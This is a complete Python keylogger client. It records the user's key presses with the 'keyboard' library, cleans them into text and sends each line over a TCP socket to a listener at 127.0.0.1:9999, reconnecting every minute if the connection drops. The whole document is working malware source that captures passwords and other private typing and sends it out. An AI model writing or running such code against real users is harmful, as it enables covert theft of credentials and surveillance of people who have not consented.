#!/usr/bin/env python3
import keyboard
import socket
from time import sleep
# Must be run with sudo or as su on linux

def client():
    s = socket.socket()
    host = "127.0.0.1"
    port = 9999

    try:
        s.connect((host, port))
    except socket.error:
        sleep(60)
        client()

    keylogger(s)


def keylogger(s):
    while True:
        list = []
        remove = ["unknown", "shift", "backspace", "skift"]
        recorded = keyboard.record(until='enter')

        for event in recorded:
            if event.event_type == keyboard.KEY_DOWN and hasattr(event, 'name'):
                list.append(str(event.name))

        for i in range(len(list)):
            if list[i] == "space":
                list[i] = " "
            elif list[i] == "enter":
                list[i] = "\n"

        list = [element for element in list if element not in remove]

        s.send(str.encode(''.join(list)))

client()
